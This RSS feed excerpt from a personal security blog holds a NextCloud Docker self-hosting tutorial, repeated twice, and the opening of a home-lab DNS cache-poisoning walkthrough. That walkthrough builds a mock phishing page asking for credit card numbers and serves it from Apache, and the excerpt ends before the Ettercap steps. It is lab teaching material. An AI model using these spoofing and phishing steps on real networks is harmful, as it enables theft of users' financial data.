&lt;p&gt;Now, visiting &lt;code&gt;&amp;lt;http://localhost:80&amp;gt;&lt;/code&gt; in the browser of my Kali VM leads to the NextCloud web interface.&lt;/p&gt;
&lt;h1 id=&#34;setting-up-nextcloud-foruse&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*09ClzbW6QlZFUKeE8VCFqw.png&#34; alt=&#34;&#34;  /&gt;

Setting up NextCloud for use&lt;/h1&gt;
&lt;h2 id=&#34;create-adminaccount&#34;&gt;Create Admin Account&lt;/h2&gt;
&lt;p&gt;Like the initial homepage says, you can create an admin account by entering your desired credentials into the login form. Then click the install button below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NCg8BFzJsn7Q8DSYJc22gw.png&#34; alt=&#34;&#34;  /&gt;

You will be prompted with a screen that optionally allows you to install reccomended apps.&lt;/p&gt;
&lt;h2 id=&#34;create-useraccount&#34;&gt;Create User Account&lt;/h2&gt;
&lt;p&gt;Each user of NextCloud will only be able to view their respective files. To create a user account, click on your profile picture and click &lt;code&gt;Users&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*rpUr6mASFndr9leQFgxjSw.png&#34; alt=&#34;&#34;  /&gt;

Then, click the &lt;code&gt;New user&lt;/code&gt; button in the upper-righthand corner.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XZ6nK22WFx20KFCEcIweNg.png&#34; alt=&#34;&#34;  /&gt;

Fill in the form that appears with your desired information. and click &lt;code&gt;Add a new user&lt;/code&gt;. You can verify that the user was added by logging out of your administrator account and logging in with the user credentials.&lt;/p&gt;
&lt;h2 id=&#34;whitelisting-domains&#34;&gt;Whitelisting Domains&lt;/h2&gt;
&lt;p&gt;Now, we’ll need to configure the NextCloud server so that we can access it from other devices.&lt;/p&gt;
&lt;p&gt;You’ll need to know your IP address. I use the &lt;code&gt;ifconfig&lt;/code&gt; command on my Kali VM to determine. Windows users can use &lt;code&gt;ipconfig&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*EPZQQ90fBx0es5jESHsJQg.png&#34; alt=&#34;&#34;  /&gt;

I’ll install vim as a text editor so that I can edit the config files easier.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;┌──&lt;/span&gt;(kali&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;㉿&lt;/span&gt;kali)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;]  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;└─&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; sudo docker exec &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;it my\_cloud bash   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;f6d476ccd902:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#75715e&#34;&gt;# apt update  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;f6d476ccd902:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#75715e&#34;&gt;# apt install -y vim  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;f6d476ccd902:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#75715e&#34;&gt;# vim config/config.php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In your &lt;code&gt;config/config.php&lt;/code&gt; file, add the option of &lt;code&gt;trusted_domains&lt;/code&gt; at the bottom, starting on line 21 (type &lt;code&gt;:set number&lt;/code&gt; in vim to show line numbers). This option will allow you to connect to the NextCloud server through different domain names. Without this option, you would not be able to use your server through a domain name besides localhost, which is not ideal if you’re trying to access it remotely.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;trusted\_domains&amp;#39; =&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; [  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;localhost&amp;#39;,  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;127.0.0.1&amp;#39;,  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;&amp;lt;YOUR IP ADDRESS&amp;gt;&amp;#39;,  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;&amp;lt;YOUR DOMAIN NAME (optional)&amp;gt;&amp;#39;,  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ],
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RFzQIvqVYLkE7HLgJ2eciA.png&#34; alt=&#34;&#34;  /&gt;

Now, I can use my NextCloud server from 192.168.1.53, 127.0.0.1, and localhost.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can optionally choose to configure your own database. The documentation for doing that can be found &lt;a href=&#34;https://docs.nextcloud.com/server/latest/admin_manual/configuration_database/linux_database_configuration.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;connecting-from-otherdevices&#34;&gt;Connecting From Other Devices&lt;/h1&gt;
&lt;h2 id=&#34;pc&#34;&gt;PC&lt;/h2&gt;
&lt;p&gt;To connect from you PC, just type in the IP address of your NextCloud server into your browser and type in your login credentials.&lt;/p&gt;
&lt;h2 id=&#34;mobile&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YSMzF6AAy_s1ddUyTn1fRA.png&#34; alt=&#34;&#34;  /&gt;

Mobile&lt;/h2&gt;
&lt;p&gt;You can also connect to the website from your phone. Alternatively, you can download the NextCloud app, available in the &lt;a href=&#34;https://apps.apple.com/us/app/nextcloud/id1125420102&#34;&gt;App Store&lt;/a&gt; and &lt;a href=&#34;https://apps.apple.com/us/app/nextcloud/id1125420102&#34;&gt;Google Play Store&lt;/a&gt;. Just type the same URL into the app that you would type in the browser.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*rXIb7WPys_Tqgbh_&#34; alt=&#34;&#34;  /&gt;

Conclusion&lt;/h1&gt;
&lt;p&gt;NextCloud allows for a tremendous amount of flexibility. There are many configurations that you can set including brute force protection, antivirus scanning, OAuth2, and more as shown in &lt;a href=&#34;https://docs.nextcloud.com/server/latest/admin_manual/configuration_server/index.html&#34;&gt;their documentation&lt;/a&gt;. I hope that you got value out of this article and were inspired to take control of your data.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h1 id="why-create-a-cloudserver"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-WVjY5h4EpphjjX7" alt=""  />

Why Create a Cloud Server?</h1>
<p>As many security-conscious people are aware, saving something in the cloud really means saving it on somebody else’s computer. When using cloud services, you don’t own the data that you upload, nor do you own the program that you’re using. Additionally, it is within the cloud service provider’s rights to delete your data or remove your access to it if they had technical issues, went bankrupt, or you missed a bill. Not all of them will do that, but there is no law protecting the customer from something like this happening. There aren’t any measures in place to prevent the government or corporations from looking through your data and using it for their own objectives (in the US).</p>
<p>Aside from data security, creating your cloud server provides the opportunity to learn more about how cloud storage works, get practice with hosting a docker container and connecting to it on your LAN, and challenge yourself to do something new.</p>
<h1 id="why-nextcloud">Why NextCloud</h1>
<p>NextCloud is free and open source. They do not collect or share any of your data. For the paranoid, you can audit the <a href="https://github.com/nextcloud">source code</a> yourself to verify this. The cost of a NextCloud server will be limited to the of the infrastructure that you’re using to host it.</p>
<h1 id="my-setup">My Setup</h1>
<p>In this demonstration, I’ll be hosting the NextCloud server in a Kali Linux virtual machine. Although I’m using Kali, you can do this on any operating system that allows you to download Docker. I’ll be accessing it through other devices on my LAN.</p>
<h1 id="creating-your-docker-container">Creating Your Docker Container</h1>
<p>To start, if you don’t already have docker installed, you can find the release for your operating system here: <a href="https://docs.docker.com/desktop/release-notes/">https://docs.docker.com/desktop/release-notes/</a></p>
<h2 id="pull-and-run-the-nextcloud-container">Pull and run the NextCloud container</h2>
<p>To find the versions of NextCloud that are available to you, visit their docker website: <a href="https://hub.docker.com/_/nextcloud">https://hub.docker.com/_/nextcloud</a>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*yVUBpaz7cPnubERvyi-o7w.png" alt=""  />

In this example, I’ll be using version 24.0.11, but you can substitute with whichever version you’re using.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo docker pull nextcloud:24.0.11
</span></span></code></pre></div><p>The output of that command will look like this once it is completed:</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GN-cYnfs54AiOogx8-NAQw.png" alt=""  />

Next, I’ll start the container and bind it to port 80 on my Kali VM.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo docker run --name my\_cloud -d -p 80:80 nextcloud:24.0.11 
</span></span></code></pre></div><p><strong>Explanation:</strong></p>
<ul>
<li><code>--name</code> will set the container name to be <code>my_cloud</code></li>
<li><code>-d</code> will run the container in detached mode. This means that the container will run in the background of my terminal instead of displaying all the output</li>
<li><code>-p</code> allows for port-binding from port 80 of the docker container to port 80 of the machine that the container is running on so that we can access it in the browser</li>
</ul>
<p>Now, visiting <code>&lt;http://localhost:80&gt;</code> in the browser of my Kali VM leads to the NextCloud web interface.</p>
<h1 id="setting-up-nextcloud-foruse"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*09ClzbW6QlZFUKeE8VCFqw.png" alt=""  />

Setting up NextCloud for use</h1>
<h2 id="create-adminaccount">Create Admin Account</h2>
<p>Like the initial homepage says, you can create an admin account by entering your desired credentials into the login form. Then click the install button below.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*NCg8BFzJsn7Q8DSYJc22gw.png" alt=""  />

You will be prompted with a screen that optionally allows you to install reccomended apps.</p>
<h2 id="create-useraccount">Create User Account</h2>
<p>Each user of NextCloud will only be able to view their respective files. To create a user account, click on your profile picture and click <code>Users</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*rpUr6mASFndr9leQFgxjSw.png" alt=""  />

Then, click the <code>New user</code> button in the upper-righthand corner.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*XZ6nK22WFx20KFCEcIweNg.png" alt=""  />

Fill in the form that appears with your desired information. and click <code>Add a new user</code>. You can verify that the user was added by logging out of your administrator account and logging in with the user credentials.</p>
<h2 id="whitelisting-domains">Whitelisting Domains</h2>
<p>Now, we’ll need to configure the NextCloud server so that we can access it from other devices.</p>
<p>You’ll need to know your IP address. I use the <code>ifconfig</code> command on my Kali VM to determine. Windows users can use <code>ipconfig</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*EPZQQ90fBx0es5jESHsJQg.png" alt=""  />

I’ll install vim as a text editor so that I can edit the config files easier.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~</span>]  
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#f92672">$</span> sudo docker exec <span style="color:#f92672">-</span>it my\_cloud bash   
</span></span><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>f6d476ccd902:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#75715e"># apt update  </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>  
</span></span><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>f6d476ccd902:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#75715e"># apt install -y vim  </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>  
</span></span><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>f6d476ccd902:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#75715e"># vim config/config.php</span>
</span></span></code></pre></div><p>In your <code>config/config.php</code> file, add the option of <code>trusted_domains</code> at the bottom, starting on line 21 (type <code>:set number</code> in vim to show line numbers). This option will allow you to connect to the NextCloud server through different domain names. Without this option, you would not be able to use your server through a domain name besides localhost, which is not ideal if you’re trying to access it remotely.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> &#39;trusted\_domains&#39; =&gt;  
</span></span><span style="display:flex;"><span> [  
</span></span><span style="display:flex;"><span> &#39;localhost&#39;,  
</span></span><span style="display:flex;"><span> &#39;127.0.0.1&#39;,  
</span></span><span style="display:flex;"><span> &#39;&lt;YOUR IP ADDRESS&gt;&#39;,  
</span></span><span style="display:flex;"><span> &#39;&lt;YOUR DOMAIN NAME (optional)&gt;&#39;,  
</span></span><span style="display:flex;"><span> ],
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*RFzQIvqVYLkE7HLgJ2eciA.png" alt=""  />

Now, I can use my NextCloud server from 192.168.1.53, 127.0.0.1, and localhost.</p>
<p><strong>Note:</strong> You can optionally choose to configure your own database. The documentation for doing that can be found <a href="https://docs.nextcloud.com/server/latest/admin_manual/configuration_database/linux_database_configuration.html">here</a>.</p>
<h1 id="connecting-from-otherdevices">Connecting From Other Devices</h1>
<h2 id="pc">PC</h2>
<p>To connect from you PC, just type in the IP address of your NextCloud server into your browser and type in your login credentials.</p>
<h2 id="mobile"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*YSMzF6AAy_s1ddUyTn1fRA.png" alt=""  />

Mobile</h2>
<p>You can also connect to the website from your phone. Alternatively, you can download the NextCloud app, available in the <a href="https://apps.apple.com/us/app/nextcloud/id1125420102">App Store</a> and <a href="https://apps.apple.com/us/app/nextcloud/id1125420102">Google Play Store</a>. Just type the same URL into the app that you would type in the browser.</p>
<h1 id="conclusion"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*rXIb7WPys_Tqgbh_" alt=""  />

Conclusion</h1>
<p>NextCloud allows for a tremendous amount of flexibility. There are many configurations that you can set including brute force protection, antivirus scanning, OAuth2, and more as shown in <a href="https://docs.nextcloud.com/server/latest/admin_manual/configuration_server/index.html">their documentation</a>. I hope that you got value out of this article and were inspired to take control of your data.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Practical Demonstration: DNS Spoofing &#43; Home Lab</title>
      <link>https://ally-petitt.com:443/en/posts/2023-03-28_practical-demonstration--dns-spoofing---home-lab-f7294443fb23/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-03-28_practical-demonstration--dns-spoofing---home-lab-f7294443fb23/</guid>
      <description>&lt;h2 id=&#34;dns-cache-poisoning-on-home-lab-walkthrough&#34;&gt;DNS Cache Poisoning on Home Lab Walkthrough&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*P3ZahJWqz8AFbk9s.png&#34; alt=&#34;Basic DNS cache poisoning attack&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png&#34;&gt;https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;In this article, I will be walking you through a common method of implementing DNS cache poisoning on a network. I’ll illustrate my process with screenshots, commands, and explanations. You are welcome to follow along and gain hands-on experience with DNS spoofing to further reinforce the knowledge that you already have.&lt;/p&gt;
&lt;h2 id=&#34;intended-audience&#34;&gt;Intended Audience&lt;/h2&gt;
&lt;p&gt;This is intended for a more technical audience. If you’re a beginner, I recommend looking for a more comprehensive tutorial to walk you through all the terminology and commands. For the purposes of this article, I’m assuming that you already have a foundational understanding of Linux, DNS, virtual machines, and potentially troubleshooting. I will not be explaining how DNS cache poisoning works. For more information, you may read the articles linked in the “More Reading” section at the end of this post.&lt;/p&gt;
&lt;h2 id=&#34;tools-used&#34;&gt;Tools Used&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Windows VM&lt;/li&gt;
&lt;li&gt;Kali VM&lt;/li&gt;
&lt;li&gt;Ettercap&lt;/li&gt;
&lt;li&gt;Text editor&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You will also need root/system privileges or sudo abilities on the attacking machine.&lt;/p&gt;
&lt;h1 id=&#34;practical-demonstration&#34;&gt;Practical Demonstration&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Find the IP address of your attacker machine&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Since I’m doing this on my LAN, I can use my private IPv4 address, which I truncated from the &lt;code&gt;ifconfig&lt;/code&gt; command for the purpose of this demonstration.&lt;/p&gt;
&lt;h2 id=&#34;2-create-the-landing-page-of-your-malicious-website&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*UY_WaZN3PluXBghyE4c0nA.png&#34; alt=&#34;&#34;  /&gt;

2. Create the landing page of your malicious website&lt;/h2&gt;
&lt;p&gt;Now, we’ll prepare the HTML file that the victim will encounter once the DNS has been spoofed. Since I’m using an Apache webserver, I’ll place the file in the root directory on my machine, which is &lt;code&gt;/var/www/html&lt;/code&gt;. This is my file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;┌──&lt;/span&gt;(ally&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;㉿&lt;/span&gt;kali)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html]  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;└─&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; cat index&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;html   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;No More Planting Trees&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;No More Planting Trees&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;h3&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;YouR CaR&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s ExteNDeD WarraNTy is AlMosT OuT&amp;lt;/h3&amp;gt;  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Give me all your PII NOW &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; your identity will be stolen &lt;span style=&#34;color:#f92672&#34;&gt;!!!&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&amp;lt;/&lt;/span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;label &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Enter YouR CreDIT CarD Number ASAP &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;ASAP&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;label&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;input id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cc&amp;#34;&lt;/span&gt; placeholder&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;or else&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I then changed the ownership of the file to the service account &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo chown www-data ./index.html
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Start Malicious Web Server&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;As stated previously, I’m using Apache, so I just started the&lt;code&gt;apache2&lt;/code&gt; service.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8yqslDbjbDYLIde9DLp0Jw.png&#34; alt=&#34;&#34;  /&gt;

When I visit &lt;code&gt;[http://127.0.0.1/index.html](http://127.0.0.1/index.html,)&lt;/code&gt;, I see my malicious webpage.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*c0hPCdzDnLLWE_0zuWDwtw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;No one would actually enter their credit card number here… right??&lt;/em&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Verify Website is Reachable from Victim Computer&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;This is pretty simple. I just visit my Kali IPv4 address in the browser of Windy Runner (my VM) to verify that it can be loaded from the Windows machine.&lt;/p&gt;
